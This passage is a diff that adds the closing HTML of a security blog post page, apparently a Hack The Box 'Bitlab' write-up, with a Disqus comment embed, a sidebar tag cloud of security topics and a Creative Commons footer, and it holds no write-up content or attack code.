+        var disqus_shortname = "matthieukeller";
+        var disqus_identifier = "2020/01/htb-bitlab.html";
+
+        (function() {
+        var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+        dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        })();
+    </script>
+    <noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+
+    <div class="clearfix"></div>
+
+</article>
+<!-- /.entry -->
+            </div>
+        </section>
+
+        <aside class="sidebar pure-u-7-24">
+            <div class="l-box">
+    <section class="module menuitems">
+        <h3 class="title module-title">Menu</h3>
+
+        <ul>
+                <li>
+                    <span class= "icons icons-archives"></span>
+                    <a href="/archives">archives</a>
+                </li>
+                <li>
+                    <span class= "icons icons-feeds"></span>
+                    <a href="/feeds/all.atom.xml">feeds</a>
+                </li>
+                <li>
+                    <span class= "icons icons-links"></span>
+                    <a href="/pages/links.html">links</a>
+                </li>
+        </ul>
+    </section>
+
+    <section class="module social">
+        <h3 class="title module-title">Social</h3>
+
+        <ul>
+                <li>
+                    <span class= "icons icons-github"></span>
+                    <a href="https://github.com/maggick">github</a>
+                </li>
+                <li>
+                    <span class= "icons icons-twitter"></span>
+                    <a href="https://twitter.com/maggick_fr">twitter</a>
+                </li>
+                <li>
+                    <span class= "icons icons-stackoverflow"></span>
+                    <a href="http://stackoverflow.com/users/1827067/maggick">stackoverflow</a>
+                </li>
+        </ul>
+    </section>
+
+
+<section class="module tagcloud">
+    <h3 class="title module-title">Tags</h3>
+
+    <ul>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/screen.html">screen</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/devops.html">devops</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/raspberry.html">raspberry</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/bruteforce.html">bruteforce</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/windows.html">windows</a>
+            </li>
+            <li class="tag tag-2">
+              <a href="https://maggick.fr/tag/challenge.html">challenge</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/microsoft.html">microsoft</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/drupal.html">drupal</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/leak.html">leak</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/suid.html">SUID</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/winrm.html">winrm</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/exchange.html">exchange</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/sstic.html">sstic</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/reverse.html">reverse</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/cryptography.html">cryptography</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/procdump.html">procdump</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/osmc.html">osmc</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="https://maggick.fr/tag/exploit.html">exploit</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/metasploit.html">metasploit</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/centreon.html">centreon</a>
+            </li>
+            <li class="tag tag-2">
+              <a href="https://maggick.fr/tag/htb.html">HTB</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/cisco.html">Cisco</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/server.html">server</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/rop.html">ROP</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/ndh.html">ndh</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/sqli.html">SQLi</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/gogs.html">gogs</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/hash.html">hash</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/x64dbg.html">x64dbg</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/chrome.html">chrome</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="https://maggick.fr/tag/ctf.html">ctf</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/lorem-ipsum.html">lorem ipsum</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/gitlab.html">gitlab</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/mail.html">mail</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/api.html">api</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/bypass.html">bypass</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/postgresql.html">postgresql</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="https://maggick.fr/tag/blog.html">blog</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/meterpreter.html">meterpreter</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/msfvenom.html">msfvenom</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/code-review.html">code review</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/cygwin.html">cygwin</a>
+            </li>
+            <li class="tag tag-1">
+              <a href="https://maggick.fr/tag/vulnhub.html">vulnhub</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/kiosk.html">kiosk</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/ret2libc.html">ret2libc</a>
+            </li>
+            <li class="tag tag-1">
+              <a href="https://maggick.fr/tag/boot2root.html">boot2root</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/ssl.html">SSL</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/lets-encrypt.html">let's encrypt</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/buffer-overflow.html">buffer overflow</a>
+            </li>
+            <li class="tag tag-2">
+              <a href="https://maggick.fr/tag/programming.html">programming</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/waf.html">WAF</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/python.html">python</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/smb.html">smb</a>
+            </li>
+            <li class="tag tag-2">
+              <a href="https://maggick.fr/tag/misc.html">misc</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/cmus.html">cmus</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="https://maggick.fr/tag/cve.html">cve</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="https://maggick.fr/tag/git.html">git</a>
+            </li>
+            <li class="tag tag-1">
+              <a href="https://maggick.fr/tag/security.html">security</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/vault.html">vault</a>
+            </li>
+    </ul>
+</section>
+
+            </div>
+        </aside>
+    </div>
+
+    <section class="pure-g-r footer">
+<div class="pure-u-2-3 copyright">
+    <p class="l-box">
+        The content of this blog in under
+        <a href="http://creativecommons.org/licenses/by-sa/4.0/"
+            title="Share, adapt, use.        But mention the author and keep the same license">Creative Commons Attribution 4.0</a> License.
+
+        The source code is available on <a href="https://github.com/maggick/blog/" title="Contribute through GitHub">GitHub</a>.
+    </p>
+</div>
+
+<div class="pure-u-1-3 credits">
+    <p class="l-box">
+        Design by <a href="http://www.templateify.com/" title="Maggner Theme">Templateify</a>.
+    </p>
+</div>    </section>
+
+
+</div>
+</body>
+</html>
